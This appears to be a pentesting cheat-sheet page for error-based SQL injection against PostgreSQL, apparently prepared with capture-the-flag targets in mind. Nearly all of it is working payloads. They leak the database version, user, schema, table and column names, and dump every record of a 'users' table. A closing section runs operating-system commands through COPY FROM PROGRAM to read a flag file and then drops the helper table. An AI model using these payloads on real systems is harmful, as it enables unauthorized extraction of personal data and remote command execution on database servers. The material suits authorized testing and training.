# PostgreSQL

### _<mark style="background-color:purple;">Error-Based SQLi</mark>_

```sql
' AND 1=CAST(CURRENT_SCHEMA() AS TEXT)--
#get current search path schema
```

{% code overflow="wrap" %}
```sql
' AND 1=CAST((SELECT concat('DATABASE: ',current_database())) as int)--

```
{% endcode %}

```sql
' AND CAST((SELECT version()) AS INT)=1337 --
#get current version
```

```sql
' and ''=''||box(user)--
#get SQL server name
```

{% code overflow="wrap" %}
```sql
' AND 1=CAST((SELECT concat('SCHEMA: ', current_schema())) AS int)-- 
#get schema name
```
{% endcode %}

{% code overflow="wrap" %}
```sql
' AND 1=CAST((SELECT concat('TABLE: ', (SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname='public' LIMIT 1))) AS int)--
#get table name
```
{% endcode %}

{% code overflow="wrap" %}
```sql
' and ''=''||box((select string_agg(column_name, ',') from information_schema.columns where table_catalog=current_database() and table_name='users'))--
#get column names for the table users
```
{% endcode %}

{% code overflow="wrap" %}
```sql
' and ''=''||box((select array_to_string(array_agg(weight || ',' || height || ',' || created_at || ',' || active || ',' || gender || ',' || email), '|| ') from users))--
#retrieve all info stored in users
```
{% endcode %}

#### Command injection:

<pre class="language-plsql" data-overflow="wrap"><code class="lang-plsql">-- create table and send command
'; CREATE TABLE commands(data text);COPY commands FROM PROGRAM 'cat /var/www/flag.txt';--
<strong>
</strong><strong>--  read output from command
</strong>' and ''=''||box((SELECT data FROM commands))--

-- delete table
';DROP TABLE commands--
</code></pre>
